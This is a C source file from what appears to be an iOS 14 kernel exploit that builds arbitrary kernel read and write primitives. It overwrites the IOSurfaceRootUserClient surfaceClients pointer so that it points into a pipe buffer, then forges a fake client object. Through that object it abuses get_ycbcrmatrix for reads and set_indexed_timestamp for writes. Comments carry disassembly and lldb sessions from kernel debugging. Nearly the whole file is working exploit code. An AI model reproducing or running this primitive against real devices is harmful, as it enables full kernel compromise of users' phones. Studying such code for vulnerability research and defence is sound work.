#include <stdio.h>
#include <stdint.h>
#include "kprimitive.h"
#include "main.h"
#include "IOSurfaceRoot.h"
#include "offsets.h"
#include "krw.h"
#include "kutils.h"
#include "find_port.h"

extern io_connect_t IOSurfaceRootUserClient;
extern uint64_t IOSurfaceRootUserClient_addr;

extern int *pipefds;
extern uint8_t *pipe_buffer;

extern size_t pipe_buffer_size;

uint64_t pipe_base = 0;

void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    read(pipefds[0], pipe_buffer, read_size);
    // printf("pipe_buffer = %s\n", pipe_buffer)
}

void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    write(pipefds[1], pipe_buffer, write_size);
}

uint64_t surfaceClients = 0;
void build_stable_kmem_api()
{
    uint64_t p_fd = kread64(proc_of_pid(getpid()) + off_p_pfd); //kapi_read_kptr(proc_of_pid(getpid()) + OFFSET(proc, p_fd));
    uint64_t fd_ofiles = kread64(p_fd); //kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    uint64_t rpipe_fp = kread64(fd_ofiles + pipefds[0] * 8); //kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    uint64_t fp_glob = kread64(rpipe_fp + off_fp_fglob); //kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    uint64_t rpipe = kread64(fp_glob + off_fg_data); //kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kread64(rpipe + off_pb_buffer); //kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

    //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         ; __int64 __fastcall IOSurfaceRootUserClient::release_surface(__int64, unsigned int)
    //com.apple.iokit.IOSurface:__text:FFFFFFF008427630                         __ZN23IOSurfaceRootUserClient15release_surfaceEj
    //...
    //com.apple.iokit.IOSurface:__text:FFFFFFF008427660 68 8E 40 F9                             LDR             X8, [X19,#0x118] ; x8 = surfaceClient
	// OFFSET(IOSurfaceRootUserClient, surfaceClients) = 0x118;

    // (lldb) c
    // error: Process is running.  Use 'process interrupt' to pause execution.
    // Process 1 stopped

    // breakpoint set at...
    // com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         ; __int64 __fastcall IOSurfaceRootUserClient::get_ycbcrmatrix(__int64, unsigned int, _DWORD *)
    // 0xFFFFFFF008428114 + 0x40
    //
    // * thread #1, stop reason = breakpoint 5.1
    //     frame #0: 0xfffffff013f48154
    //     0xfffffff013f48150: ldr    x8, [x19, #0x118] (0xfffffff013f48150 = 0xFFFFFFF008428150(no kslide)) 
    // ->  0xfffffff013f48154: ldr    x0, [x8, w22, uxtw #3]
    //     0xfffffff013f48158: cbz    x0, 0xfffffff013f48168
    //     0xfffffff013f4815c: mov    x1, x21
    //     0xfffffff013f48160: bl     0xfffffff013f42500
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x8
    //       x8 = 0xffffffe4cda8a000
    // (lldb) x/gx 0xffffffe4cda8a000
    // 0xffffffe4cda8a000: 0x6570697065706970
    // (lldb) x/s 0xffffffe4cda8a000
    // 0xffffffe4cda8a000: "pipepipe\x10\xa0\xa8\xcd\xe4\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipeL?\xb2\x12\xf0\xff\xff\xffpipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepipepip"
    // 0xffffffe4cda8a000 = pipe_buffer

	surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);
	printf("surfaceClients = 0x%llx\n", surfaceClients);

	kwrite64(IOSurfaceRootUserClient_addr + 0x118, pipe_base);
}

void clean_stable_kmem_api()
{
    kwrite64(IOSurfaceRootUserClient_addr + 0x118, surfaceClients);
}

// iOS 14.x only
struct fake_client {
    uint64_t pad_00; // can not use IOSurface 0 now         //off=0x0
    uint64_t uc_obj;                                        //off=0x8 v
    uint8_t pad_10[0x40]; // start of IOSurfaceClient obj   //off=0x10
    uint64_t surf_obj;                                      //off=0x50 v
    uint8_t pad_58[0x360 - 0x58];                           //off=0x58
    uint64_t shared_RW;                                     //off=0x360
};

uint32_t kpri_read32(uint64_t where) {

    struct fake_client *p = (void *)pipe_buffer;

    //bp set in...
    //com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         __ZN23IOSurfaceRootUserClient15get_ycbcrmatrixEjPj
    //0xFFFFFFF008428114+0x40 = 0xFFFFFFF008428154
    //
    // Process 1 stopped
    // * thread #2, stop reason = instruction step into
    //     frame #0: 0xfffffff0213cc154
    // ->  0xfffffff0213cc154: ldr    x0, [x8, w22, uxtw #3]
    //     0xfffffff0213cc158: cbz    x0, 0xfffffff0213cc168
    //     0xfffffff0213cc15c: mov    x1, x21
    //     0xfffffff0213cc160: bl     0xfffffff0213c6500
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x8
    //       x8 = 0xffffffe4cdca1000
    // (lldb) x/32gx 0xffffffe4cdca1000
    // 0xffffffe4cdca1000: 0x4443424144434241 0xffffffe4cdca1010 <- p->uc_obj = pipe_base + 0x10; offsetof(uc_obj, p) = 0x8;
    // 0xffffffe4cdca1010: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1020: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1030: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1040: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1050: 0xfffffff01ffa7f4c 0x4443424144434241 <- p->surf_obj = where - 0xb4; offsetof(surf_obj, p) = 0x50;
    // 0xffffffe4cdca1060: 0x4443424144434241 0x4443424144434241
    // 0xffffffe4cdca1070: 0x4443424144434241 0x4443424144434241
    p->uc_obj = pipe_base + 0x10;

    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         ; __int64 __fastcall sub_FFFFFFF00841FA60(__int64)
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60                         sub_FFFFFFF00841FA60                    ; CODE XREF: IOSurface::getYCbCrMatrix(void)+14↓p
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA60 00 B4 40 B9                             LDR             W0, [X0,#0xB4]
    // com.apple.iokit.IOSurface:__text:FFFFFFF00841FA64 C0 03 5F D6                             RET

    // Process 1 stopped
    // * thread #1, stop reason = breakpoint 2.1
    //     frame #0: 0xfffffff0213c3a60
    // ->  0xfffffff0213c3a60: ldr    w0, [x0, #0xb4]
    //     0xfffffff0213c3a64: ret    
    //     0xfffffff0213c3a68: strb   w1, [x0, #0x1f8]
    //     0xfffffff0213c3a6c: ret    
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read x0
    //       x0 = 0xfffffff01ffa7f4c
    // (lldb) p/x 0xfffffff01ffa7f4c+0xb4
    // (unsigned long) 0xfffffff01ffa8000
    // (lldb) x/gx 0xfffffff01ffa8000 <- KERNEL_BASE
    // 0xfffffff01ffa8000: 0x0100000cfeedfacf
    // (lldb) ni
    // ...
    // Target 1: (kernelcache.iPhone10,1.18D70) stopped.
    // (lldb) reg read w0
    //       w0 = 0xfeedfacf
    p->surf_obj = where - 0xb4;
    write_pipe();

    //call stack:
    //com.apple.iokit.IOSurface:__text:FFFFFFF008428114                         ; __int64 __fastcall IOSurfaceRootUserClient::get_ycbcrmatrix(__int64, unsigned int, __int64)
    //...
    //__TEXT_EXEC:__text:FFFFFFF00803B3AC                         ; IOReturn __cdecl IOUserClient::externalMethod(IOUserClient *__hidden this, uint32_t selector, IOExternalMethodArguments *arguments, IOExternalMethodDispatch *dispatch, OSObject *target, void *reference)
    //__TEXT_EXEC:__text:FFFFFFF00803B590 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF008045020                         ; __int64 __fastcall is_io_connect_method(__int64, unsigned int, __int64, int, __int64, int, _DWORD *, unsigned __int64, __int64, _DWORD *, unsigned __int64, _DWORD *, _DWORD *, unsigned __int64 *, _DWORD *, __int64, unsigned __int64 *)
    //__TEXT_EXEC:__text:FFFFFFF008045360 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B45334                         ; __int64 __fastcall _Xio_connect_method(__int64 result, __int64)
    //__TEXT_EXEC:__text:FFFFFFF007B454C0 D8 FE 13 94                             BL              _is_io_connect_method
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A58324                         _ipc_kobject_server                     ; CODE XREF: sub_FFFFFFF007A2C210+120↑p
    //__TEXT_EXEC:__text:FFFFFFF007A585E0 00 01 3F D6                             BLR             X8
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A2C210                         ; __int64 __fastcall ipc_kmsg_send(__int64, __int64, __int64)
    //__TEXT_EXEC:__text:FFFFFFF007A2C330 FD AF 00 94                             BL              _ipc_kobject_server
    //...
    //__TEXT_EXEC:__text:FFFFFFF007A461BC                         _mach_msg_overwrite_trap                ; CODE XREF: sub_FFFFFFF007A465D4+4↓j
    //__TEXT_EXEC:__text:FFFFFFF007A462A4 DB 97 FF 97                             BL              _ipc_kmsg_send
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B6B9BC                         ; __int64 __fastcall mach_syscall(_DWORD *)
    //__TEXT_EXEC:__text:FFFFFFF007B6BB2C C0 02 3F D6                             BLR             X22
    //...
    //__TEXT_EXEC:__text:FFFFFFF007B7702C                         ; __int64 __fastcall sleh_synchronous(__int64 result, unsigned __int64, const void *)
    //__TEXT_EXEC:__text:FFFFFFF007B77640 DF D0 FF 97                             BL              _mach_syscall
    //...
    //__TEXT_EXEC:__text:FFFFFFF0080AD5D4                         ; __int64 __fastcall fleh_synchronous(__int64)
    //__TEXT_EXEC:__text:FFFFFFF0080AD5F8 8D 26 EB 97                             BL              _sleh_synchronous

    printf("Going to call iosurface_s_get_ycbcrmatrix, set breakpoint first and press any key.\n"); char ch; ch = getchar();
    
    uint32_t v = iosurface_s_get_ycbcrmatrix();
    read_pipe();
    return v;
};

void kpri_write64(uint64_t where, uint64_t what) {
    struct fake_client *p = (void *)pipe_buffer;
    p->uc_obj = pipe_base + 0x10;
    p->surf_obj = pipe_base;
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         ; __int64 __fastcall IOSurface::setIndexedTimestamp(__int64, unsigned __int64, __int64)
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8                         __ZN9IOSurface19setIndexedTimestampEyy  ; CODE XREF: IOSurfaceRootUserClient::set_indexed_timestamp(uint,ulong long,ulong long)+5C↓p
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218F8 3F 0C 00 F1                             CMP             X1, #3
    // com.apple.iokit.IOSurface:__text:FFFFFFF0084218FC C8 00 00 54                             B.HI            loc_FFFFFFF008421914
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421900 E8 03 00 AA                             MOV             X8, X0
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421904 00 00 80 52                             MOV             W0, #0
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421908 08 B1 41 F9                             LDR             X8, [X8,#0x360] <- XXX; p->shared_RW = where; X2 = what
    // com.apple.iokit.IOSurface:__text:FFFFFFF00842190C 02 79 21 F8                             STR             X2, [X8,X1,LSL#3] // *(_QWORD *)(*(_QWORD *)(a1 + 0x360) + 8 * a2) = a3;
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421910 C0 03 5F D6                             RET
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914                         ; ---------------------------------------------------------------------------
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914                         loc_FFFFFFF008421914                    ; CODE XREF: IOSurface::setIndexedTimestamp(ulong long,ulong long)+4↑j
    // com.apple.iokit.IOSurface:__text:FFFFFFF008421914 40 58 80 52 00 00 BC 72                 MOV             W0, #0xE00002C2
    // com.apple.iokit.IOSurface:__text:FFFFFFF00842191C C0 03 5F D6                             RET
    p->shared_RW = where;
    write_pipe();
    //com.apple.iokit.IOSurface:__text:FFFFFFF008426E44                         ; __int64 __fastcall IOSurfaceRootUserClient::s_set_indexed_timestamp(__int64, __int64, __int64)
    iosurface_s_set_indexed_timestamp(what);
    read_pipe();
};